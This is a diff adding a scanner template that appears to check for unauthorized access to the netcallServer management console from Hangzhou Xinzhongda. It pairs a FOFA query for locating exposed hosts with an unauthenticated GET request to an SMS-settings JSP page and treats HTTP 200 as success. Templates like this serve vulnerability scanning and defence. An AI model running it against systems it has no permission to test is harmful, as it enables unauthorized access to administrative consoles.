@@ -1,0 +1,29 @@
+id: poc-qpm2qa3zra5edpd7
+info:
+  name: 杭州新中大科技股份有限公司netcallServer管理控制台存在未授权访问漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qpm2qa3zra5edpd7'
+  tags: unauth,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: qpm2qa3zra5edpd7
+    fofa: title="netcallserver"||(body="netcallServer"&&body="管理控制台"
+http:
+- raw:
+  - 'GET /plugins/integration/integration-appsys-sms-setting.jsp HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.1704.30 Safari/537.36
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: keep-alive'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
